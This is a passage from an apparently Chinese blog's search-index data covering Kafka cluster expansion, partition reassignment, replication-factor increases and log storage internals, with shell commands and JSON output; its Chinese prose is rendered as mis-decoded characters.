assignmentæŒ‡çš„æ˜¯è¿ç§»å‰çš„partition replicaï¼›Proposed partition reassignment configuration æŒ‡çš„å°±æ˜¯è¿ç§»åˆ†é…è§„åˆ™jsonã€‚éœ€è¦å°†è¯¥[Proposed partition reassignment configuration]jsonæ–‡ä»¶ä¿å­˜åˆ°jsonæ–‡ä»¶ä¸­(å¦‚expand-cluster-reassignment.json) è¯¥å·¥å…·ä¼šç”Ÿæˆä¸€ä¸ªå€™é€‰åˆ†é…ï¼Œå°†æ‰€æœ‰åˆ†åŒºä»ä¸»é¢˜countly_apppushï¼Œcountly_event...ç§»åŠ¨åˆ°brokers 1,2,3,4ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œåˆ†åŒºè¿åŠ¨è¿˜æ²¡æœ‰å¼€å§‹ï¼Œå®ƒåªæ˜¯å‘Šè¯‰ä½ å½“å‰çš„ä»»åŠ¡å’Œå»ºè®®çš„æ–°ä»»åŠ¡ã€‚åº”è¯¥ä¿å­˜å½“å‰çš„åˆ†é…ï¼Œä»¥é˜²ä½ æƒ³è¦å›æ»šåˆ°å®ƒã€‚æ–°çš„ä»»åŠ¡åº”è¯¥ä¿å­˜åœ¨ä¸€ä¸ªjsonæ–‡ä»¶ä¸­ï¼ˆä¾‹å¦‚expand-cluster-reassignment.jsonï¼‰ï¼Œå¹¶ç”¨--executeé€‰é¡¹è¾“å…¥åˆ°å·¥å…·ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤º: 1234567891011121314151617181920212223242526272829303132./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --executeCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":9,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":7,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":6,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":5,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":8,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":2,\"replicas\":[1,3,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":1,\"replicas\":[3,2,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":4,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":0,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":10,\"replicas\":[3,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":3,\"replicas\":[2,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":11,\"replicas\":[1,2,3]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":3,\"replicas\":[3,4,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":8,\"replicas\":[4,3,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":0,\"replicas\":[4,1,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":6,\"replicas\":[2,4,1]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":11,\"replicas\":[3,2,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":1,\"replicas\":[1,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":10,\"replicas\":[2,1,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":4,\"replicas\":[4,2,3]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":9,\"replicas\":[1,4,2]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":2,\"replicas\":[2,3,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":5,\"replicas\":[1,3,4]&#125;,&#123;\"topic\":\"mongotail_lz4_imp\",\"partition\":7,\"replicas\":[3,1,2]&#125;]&#125;``` æœ€åï¼Œå¯ä»¥ä½¿ç”¨`--verify`é€‰é¡¹æ¥æ£€æŸ¥åˆ†åŒºé‡æ–°åˆ†é…çš„çŠ¶æ€ã€‚è¯·æ³¨æ„ï¼Œç›¸åŒçš„`expand-cluster-reassignment.json`ï¼ˆä¸`--execute`é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼‰åº”è¯¥ä¸--verifyé€‰é¡¹ä¸€èµ·ä½¿ç”¨```BASH/bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --verify[jollybi@kafka4 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file expand-cluster-reassignment.json --verifyStatus of partition reassignment:Reassignment of partition [countly_event,2] completed successfullyReassignment of partition [countly_session,7] completed successfullyReassignment of partition [countly_pv,5] completed successfullyReassignment of partition [countly_apppush,1] completed successfullyReassignment of partition [countly_event,0] completed successfullyReassignment of partition [countly_session,10] completed successfullyReassignment of partition [countly_apppush,4] completed successfullyReassignment of partition [countly_event,7] is still in progressReassignment of partition [countly_metrics,7] completed successfullyReassignment of partition [countly_imp,4] is still in progressReassignment of partition [countly_apppush,10] completed successfullyReassignment of partition [countly_imp,5] is still in progress..... æ³¨æ„ï¼šåœ¨è¿ç§»è¿‡ç¨‹ä¸­ä¸èƒ½äººä¸ºçš„ç»“æŸæˆ–åœæ­¢kafkaæœåŠ¡ï¼Œä¸ç„¶ä¼šæœ‰æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜. Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/11/Bigdata-hadoop/Kafka/KafKaæ‰©å®¹ç¾¤é›†(Topic.partitionsè¿ç§»)/"},{"title":"KafkaåŠ¨æ€å¢åŠ Topicçš„å‰¯æœ¬(Replication)","text":"KafkaåŠ¨æ€å¢åŠ Topicçš„å‰¯æœ¬(Replication)å½“å‰æˆ‘çš„topic ï¼šcountly_event åªæœ‰1ä¸ªå‰¯æœ¬ï¼Œå¦‚æœé›†ç¾¤å…¶ä¸­ä¸€å°æœºå™¨å‡ºç°é—®é¢˜ï¼Œå°±ä¼šä¸¢å¤±æ•°æ®ã€‚æ‰€ä»¥è¿™é‡Œä»¥åæ–°å»ºæ–°çš„topic æœ€å°‘2ä¸ªå‰¯æœ¬ï¼Œå¦‚æœèµ„æºéå¸¸å……è¶³å¯ä»¥è€ƒè™‘å‰¯æœ¬3ä¸ªã€‚ 1234567891011121314[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-topics.sh --zookeeper 172.31.2.6:2182,172.31.2.7:2182,172.31.2.8:2182 -describe -topic countly_eventTopic:countly_event PartitionCount:12 ReplicationFactor:1 Configs: Topic: countly_event Partition: 0 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 1 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 2 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 3 Leader: 4 Replicas: 4 Isr: 4 Topic: countly_event Partition: 4 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 5 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 6 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 7 Leader: 4 Replicas: 4 Isr: 4 Topic: countly_event Partition: 8 Leader: 1 Replicas: 1 Isr: 1 Topic: countly_event Partition: 9 Leader: 2 Replicas: 2 Isr: 2 Topic: countly_event Partition: 10 Leader: 3 Replicas: 3 Isr: 3 Topic: countly_event Partition: 11 Leader: 4 Replicas: 4 Isr: 4 å¢åŠ ç°æœ‰åˆ†åŒºçš„å¤åˆ¶å› å­å¾ˆå®¹æ˜“ã€‚åªéœ€åœ¨è‡ªå®šä¹‰é‡æ–°åˆ†é…jsonæ–‡ä»¶ä¸­æŒ‡å®šé¢å¤–å‰¯æœ¬ï¼Œå¹¶å°†å…¶ä¸â€“executeé€‰é¡¹ä¸€èµ·ä½¿ç”¨å³å¯å¢åŠ æŒ‡å®šåˆ†åŒºçš„å¤åˆ¶å› å­ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹ç¤ºä¾‹å°†ä¸»é¢˜countly_eventçš„åˆ†åŒº0çš„å¤åˆ¶å› å­ä»1å¢åŠ åˆ°3.åœ¨å¢åŠ å¤åˆ¶å› å­ä¹‹å‰ï¼Œè¯¥åˆ†åŒºçš„å”¯ä¸€å‰¯æœ¬å­˜åœ¨äºä»£ç†1ä¸Šã€‚ä½œä¸ºå¢åŠ å¤åˆ¶å› å­çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†æ·»åŠ æ›´å¤šå‰¯æœ¬ç»çºªäºº2å’Œ3å’Œ4ã€‚ ç¬¬ä¸€æ­¥æ˜¯åœ¨jsonæ–‡ä»¶ä¸­æ‰‹å·¥åˆ¶ä½œè‡ªå®šä¹‰é‡æ–°åˆ†é…è®¡åˆ’ - è¿™ä¸ªè‡ªå·±å®šä¹‰æ¯ä¸ªåˆ†åŒºè®¾ç½®å‰¯æœ¬ï¼Œä¾‹å¦‚ï¼š0åˆ†åŒºè®¾ç½®åœ¨3å’Œ2å’Œ4. 123456789101112131415&#123;\"version\":1, \"partitions\": [&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[3,2,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":1,\"replicas\":[3,2,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":2,\"replicas\":[4,3,1]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":3,\"replicas\":[2,1,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":4,\"replicas\":[3,4,1]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":5,\"replicas\":[4,1,2]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[1,2,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":7,\"replicas\":[2,3,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":8,\"replicas\":[3,1,2]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":9,\"replicas\":[4,2,3]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":10,\"replicas\":[1,3,4]&#125;, &#123;\"topic\":\"countly_event\",\"partition\":11,\"replicas\":[2,4,1]&#125;] &#125; ç„¶åï¼Œä½¿ç”¨å¸¦æœ‰â€“executeé€‰é¡¹çš„jsonæ–‡ä»¶å¯åŠ¨é‡æ–°åˆ†é…è¿‡ç¨‹ 12345678910 ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json --execute[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json --executeCurrent partition replica assignment&#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":6,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":4,\"replicas\":[2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":5,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":7,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":3,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":9,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":11,\"replicas\":[1]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[2]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":10,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":2,\"replicas\":[4]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":1,\"replicas\":[3]&#125;,&#123;\"topic\":\"countly_event\",\"partition\":8,\"replicas\":[2]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;\"version\":1,\"partitions\":[&#123;\"topic\":\"countly_event\",\"partition\":0,\"replicas\":[1,2,3,4]&#125;]&#125; â€“verifyé€‰é¡¹å¯ä¸è¯¥å·¥å…·ä¸€èµ·ä½¿ç”¨ï¼Œä»¥æ£€æŸ¥åˆ†åŒºé‡æ–°åˆ†é…çš„çŠ¶æ€ã€‚è¯·æ³¨æ„ï¼Œä¸â€“verifyé€‰é¡¹ä¸€èµ·ä½¿ç”¨ç›¸åŒçš„increase-replication-factor.jsonï¼ˆä¸â€“executeé€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼‰ 1234567891011121314151617181920212223242526272829303132[jollybi@kafka1 kafka_2.10-0.9.0.1]$ ./bin/kafka-reassign-partitions.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 --reassignment-json-file increase-replication-factor.json --verifyStatus of partition reassignment:Reassignment of partition [countly_event,0] is still in progressReassignment of partition [countly_event,1] is still in progressReassignment of partition [countly_event,2] is still in progressReassignment of partition [countly_event,3] is still in progressReassignment of partition [countly_event,4] is still in progressReassignment of partition [countly_event,5] is still in progressReassignment of partition [countly_event,6] is still in progressReassignment of partition [countly_event,7] is still in progressReassignment of partition [countly_event,8] is still in progressReassignment of partition [countly_event,9] is still in progressReassignment of partition [countly_event,10] is still in progressReassignment of partition [countly_event,11] is still in progressæ‚¨è¿˜å¯ä»¥ä½¿ç”¨kafka-topicså·¥å…·éªŒè¯å¤åˆ¶å› å­çš„å¢åŠ æƒ…å†µ [root@kafka1 kafka_2.10-0.9.0.1]# ./bin/kafka-topics.sh --zookeeper 10.155.90.153:2281,10.155.90.155:2281,10.155.90.138:2281 -describe -topic countly_eventTopic:countly_event PartitionCount:12 ReplicationFactor:3 Configs: Topic: countly_event Partition: 0 Leader: 2 Replicas: 3,2,4 Isr: 2,3,4 Topic: countly_event Partition: 1 Leader: 3 Replicas: 3,2,4 Isr: 3,2,4 Topic: countly_event Partition: 2 Leader: 4 Replicas: 4,3,1 Isr: 4,1,3 Topic: countly_event Partition: 3 Leader: 1 Replicas: 2,1,3 Isr: 1,2,3 Topic: countly_event Partition: 4 Leader: 3 Replicas: 3,4,1 Isr: 4,1,3 Topic: countly_event Partition: 5 Leader: 4 Replicas: 4,1,2 Isr: 1,4,2 Topic: countly_event Partition: 6 Leader: 1 Replicas: 1,2,3 Isr: 2,1,3 Topic: countly_event Partition: 7 Leader: 2 Replicas: 2,3,4 Isr: 4,2,3 Topic: countly_event Partition: 8 Leader: 2 Replicas: 3,1,2 Isr: 2,1,3 Topic: countly_event Partition: 9 Leader: 3 Replicas: 4,2,3 Isr: 3,2,4 Topic: countly_event Partition: 10 Leader: 4 Replicas: 1,3,4 Isr: 4,1,3 Topic: countly_event Partition: 11 Leader: 1 Replicas: 2,4,1 Isr: 1,4,2 å‚è€ƒåœ°å€ï¼šhttp://kafka.apache.org/documentation/ Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/21/Bigdata-hadoop/Kafka/KafkaåŠ¨æ€å¢åŠ Topicçš„å‰¯æœ¬(Replication)/"},{"title":"Kafkaæ—¥å¿—å­˜å‚¨è§£æä¸å®è·µæ•°æ®å­˜å‚¨ä¼˜åŒ–","text":"Kafkaçš„åè¯è§£é‡Škafkaæ˜¯ä¸€æ¬¾åˆ†å¸ƒå¼æ¶ˆæ¯å‘å¸ƒå’Œè®¢é˜…çš„ç³»ç»Ÿï¼Œå…·æœ‰é«˜æ€§èƒ½å’Œé«˜ååç‡ã€‚ 1ï¼ŒBrokerï¼š ä¸€ä¸ªå•ç‹¬çš„kafkaæœºå™¨èŠ‚ç‚¹å°±ç§°ä¸ºä¸€ä¸ªbrokerï¼Œå¤šä¸ªbrokerç»„æˆçš„é›†ç¾¤ï¼Œç§°ä¸ºkafkaé›†ç¾¤ 2ï¼ŒTopicï¼šç±»ä¼¼æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¡¨ï¼Œæˆ‘ä»¬å°†æ•°æ®å­˜å‚¨åœ¨Topicé‡Œé¢ï¼Œå½“ç„¶è¿™åªæ˜¯é€»è¾‘ä¸Šçš„ï¼Œåœ¨ç‰©ç†ä¸Šï¼Œä¸€ä¸ªTopic å¯èƒ½è¢«å¤šä¸ªBrokeråˆ†åŒºå­˜å‚¨ï¼Œè¿™å¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ï¼Œç”¨æˆ·åªéœ€å…³æ³¨æ¶ˆæ¯çš„äº§ç”Ÿäºæ¶ˆè´¹å³å¯. 3ï¼ŒPartitionï¼šç±»ä¼¼åˆ†åŒºè¡¨ï¼Œæ¯ä¸ªTopicå¯æ ¹æ®è®¾ç½®å°†æ•°æ®å­˜å‚¨åœ¨å¤šä¸ªæ•´ä½“æœ‰åºçš„Partitionä¸­ï¼Œæ¯ä¸ªé¡ºåºåŒ–partitionä¼šç”Ÿæˆ2ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯indexæ–‡ä»¶ä¸€ä¸ªæ˜¯logæ–‡ä»¶ï¼Œindexæ–‡ä»¶å­˜å‚¨ç´¢å¼•å’Œåç§»é‡ï¼Œlogæ–‡ä»¶å­˜å‚¨å…·ä½“çš„æ•°æ®. 4ï¼ŒProducerï¼šç”Ÿäº§è€…ï¼Œå‘Topicé‡Œé¢å‘é€æ¶ˆæ¯çš„è§’è‰² 5ï¼ŒConsumerï¼šæ¶ˆè´¹è€…ï¼Œä»Topicé‡Œé¢è¯»å–æ¶ˆæ¯çš„è§’è‰² 6ï¼ŒConsumer Groupï¼šæ¯ä¸ªConsumerå±äºä¸€ä¸ªç‰¹å®šçš„æ¶ˆè´¹è€…ç»„ï¼Œå¯ä¸ºConsumeræŒ‡å®šgroup nameï¼Œå¦‚æœä¸æŒ‡å®šé»˜è®¤å±äºgroup é›†ç¾¤å®‰è£…ç•¥è¿‡~ æ—¥å¿—å­˜å‚¨Kafkaçš„dataæ˜¯ä¿å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ã€‚Kafkaä¸­çš„Messageæ˜¯ä»¥topicä¸ºåŸºæœ¬å•ä½ç»„ç»‡çš„ï¼Œä¸åŒçš„topicä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚ æ¯ä¸ªtopicåˆå¯ä»¥åˆ†æˆå‡ ä¸ªä¸åŒçš„partitionï¼Œæ¯ä¸ªtopicæœ‰å‡ ä¸ªpartitionæ˜¯åœ¨åˆ›å»ºtopicæ—¶æŒ‡å®šçš„ï¼Œæ¯ä¸ªpartitionå­˜å‚¨ä¸€éƒ¨åˆ†Messageã€‚ partitionæ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ¯”å¦‚ï¼Œåˆ›å»ºäº†ä¸€ä¸ªåä¸ºkakfa-node1çš„topicï¼Œå…¶æœ‰12ä¸ªpartitionï¼Œé‚£ä¹ˆåœ¨Kafkaçš„æ•°æ®ç›®å½•ä¸­(ç”±é…ç½®æ–‡ä»¶ä¸­çš„log.dirsæŒ‡å®šçš„)ä¸­å°±æœ‰è¿™æ ·5ä¸ªç›®å½•: 12345678910111213[jollybi@kafka1 kafka-logs]$ lldrwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-0drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-1drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-10drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-11drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-2drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-3drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-4drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-5drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-6drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-7drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-8drwxrwxr-x 2 jollybi jollybi 4096 Aug 23 15:56 kakfa-node1-9 å…¶å‘½åè§„åˆ™ä¸º&lt;topic_name&gt;-&lt;partition_id&gt;ï¼Œé‡Œé¢å­˜å‚¨çš„åˆ†åˆ«å°±æ˜¯è¿™12ä¸ªpartitionçš„æ•°æ®ã€‚zookeeperä¼šå°†åˆ†åŒºå¹³å‡åˆ†é…åˆ›å»ºåˆ°ä¸åŒçš„brokerä¸Šï¼Œä¾‹å¦‚ 1234567891011121314[jollybi@kafka1 tools]$ ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic kakfa-node1Topic:kakfa-node1 PartitionCount:12 ReplicationFactor:3 Configs: Topic: kakfa-node1 Partition: 0 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3 Topic: kakfa-node1 Partition: 1 Leader: 2 Replicas: 2,3,1 Isr: 2,3,1 Topic: kakfa-node1 Partition: 2 Leader: 3 Replicas: 3,1,2 Isr: 3,1,2 Topic: kakfa-node1 Partition: 3 Leader: 1 Replicas: 1,3,2 Isr: 1,3,2 Topic: kakfa-node1 Partition: 4 Leader: 2 Replicas: 2,1,3 Isr: 2,1,3 Topic: kakfa-node1 Partition: 5 Leader: 3 Replicas: 3,2,1 Isr: 3,2,1 Topic: kakfa-node1 Partition: 6 Leader: 1 Replicas: 1,2,3 Isr: 1,2,3 Topic: kakfa-node1 Partition: 7 Leader: 2 Replicas: 2,3,1 Isr: 2,3,1 Topic: kakfa-node1 Partition: 8 Leader: 3 Replicas: 3,1,2 Isr: 3,1,2 Topic: kakfa-node1 Partition: 9 Leader: 1 Replicas: 1,3,2 Isr: 1,3,2 Topic: kakfa-node1 Partition: 10 Leader: 2 Replicas: 2,1,3 Isr: 2,1,3 Topic: kakfa-node1 Partition: 11 Leader: 3 Replicas: 3,2,1 Isr: 3,2,1 Isrè¡¨ç¤ºåˆ†åŒºåˆ›å»ºåœ¨å“ªä¸ªbrokerä¸Šã€‚Partitionä¸­çš„æ¯æ¡Messageç”±offsetæ¥è¡¨ç¤ºå®ƒåœ¨è¿™ä¸ªpartitionä¸­çš„åç§»é‡ï¼Œè¿™ä¸ªoffsetä¸æ˜¯è¯¥Messageåœ¨partitionæ•°æ®æ–‡ä»¶ä¸­çš„å®é™…å­˜å‚¨ä½ç½®ï¼Œè€Œæ˜¯é€»è¾‘ä¸Šä¸€ä¸ªå€¼ï¼Œå®ƒå”¯ä¸€ç¡®å®šäº†partitionä¸­çš„ä¸€æ¡Messageã€‚å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºoffsetæ˜¯partitionä¸­Messageçš„idã€‚partitionä¸­çš„æ¯æ¡MessageåŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ï¼š 123offsetMessageSizedata å…¶ä¸­offsetä¸ºlongå‹ï¼ŒMessageSizeä¸ºint32ï¼Œè¡¨ç¤ºdataæœ‰å¤šå¤§ï¼Œdataä¸ºmessageçš„å…·ä½“å†…å®¹ã€‚ Kafkaé€šè¿‡åˆ†æ®µå’Œç´¢å¼•çš„æ–¹å¼æ¥æé«˜æŸ¥è¯¢æ•ˆç‡ 1ï¼‰åˆ†æ®µ Kafkaè§£å†³æŸ¥è¯¢æ•ˆç‡çš„æ‰‹æ®µä¹‹ä¸€æ˜¯å°†æ•°æ®æ–‡ä»¶åˆ†æ®µï¼Œæ¯”å¦‚æœ‰100æ¡Messageï¼Œå®ƒä»¬çš„offsetæ˜¯ä»0åˆ°99ã€‚å‡è®¾å°†æ•°æ®æ–‡ä»¶åˆ†æˆ5æ®µï¼Œç¬¬ä¸€æ®µä¸º0-19ï¼Œç¬¬äºŒæ®µä¸º20-39ï¼Œä»¥æ­¤ç±»æ¨ï¼Œæ¯æ®µæ”¾åœ¨ä¸€ä¸ªå•ç‹¬çš„æ•°æ®æ–‡ä»¶é‡Œé¢ï¼Œæ•°æ®æ–‡ä»¶ä»¥è¯¥æ®µä¸­æœ€å°çš„offsetå‘½åã€‚è¿™æ ·åœ¨æŸ¥æ‰¾æŒ‡å®šoffsetçš„Messageçš„æ—¶å€™ï¼Œç”¨äºŒåˆ†æŸ¥æ‰¾å°±å¯ä»¥å®šä½åˆ°è¯¥Messageåœ¨å“ªä¸ªæ®µä¸­ã€‚ 1234567891011121314[jollybi@kafka1 kafka-logs]$ ll /data/tools/kafka_2.10-0.8.2.1/kafka-logs/total 548drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-0drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-1drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-10drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-11drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-2drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-3drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-4drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-5drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-6drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-7drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-8drwxrwxr-x 2 jollybi jollybi 4096 Aug 25 11:03 kafkanode-9 2ï¼‰ä¸ºæ•°æ®æ–‡ä»¶å»ºç´¢å¼•æ•°æ®æ–‡ä»¶åˆ†æ®µä½¿å¾—å¯ä»¥åœ¨ä¸€ä¸ªè¾ƒå°çš„æ•°æ®æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯¹åº”offsetçš„Messageäº†ï¼Œä½†æ˜¯è¿™ä¾ç„¶éœ€è¦é¡ºåºæ‰«ææ‰èƒ½æ‰¾åˆ°å¯¹åº”offsetçš„Messageã€‚ä¸ºäº†è¿›ä¸€æ­¥æé«˜æŸ¥æ‰¾çš„æ•ˆç‡ï¼ŒKafkaä¸ºæ¯ä¸ªåˆ†æ®µåçš„æ•°æ®æ–‡ä»¶å»ºç«‹äº†ç´¢å¼•æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸æ•°æ®æ–‡ä»¶çš„åå­—æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ–‡ä»¶æ‰©å±•åä¸º.indexã€‚ç´¢å¼•æ–‡ä»¶ä¸­åŒ…å«è‹¥å¹²ä¸ªç´¢å¼•æ¡ç›®ï¼Œæ¯ä¸ªæ¡ç›®è¡¨ç¤ºæ•°æ®æ–‡ä»¶ä¸­ä¸€æ¡Messageçš„ç´¢å¼•ã€‚ç´¢å¼•åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼ˆå‡ä¸º4ä¸ªå­—èŠ‚çš„æ•°å­—ï¼‰ï¼Œåˆ†åˆ«ä¸ºç›¸å¯¹offsetå’Œpositionã€‚ ç›¸å¯¹offsetï¼šå› ä¸ºæ•°æ®æ–‡ä»¶åˆ†æ®µä»¥åï¼Œæ¯ä¸ªæ•°æ®æ–‡ä»¶çš„èµ·å§‹offsetä¸ä¸º0ï¼Œç›¸å¯¹offsetè¡¨ç¤ºè¿™æ¡Messageç›¸å¯¹äºå…¶æ‰€å±æ•°æ®æ–‡ä»¶ä¸­æœ€å°çš„offsetçš„å¤§å°ã€‚ä¸¾ä¾‹ï¼Œåˆ†æ®µåçš„ä¸€ä¸ªæ•°æ®æ–‡ä»¶çš„offsetæ˜¯ä»20å¼€å§‹ï¼Œé‚£ä¹ˆoffsetä¸º25çš„Messageåœ¨indexæ–‡ä»¶ä¸­çš„ç›¸å¯¹offsetå°±æ˜¯25-20 = 5ã€‚å­˜å‚¨ç›¸å¯¹offsetå¯ä»¥å‡å°ç´¢å¼•æ–‡ä»¶å ç”¨çš„ç©ºé—´ã€‚ 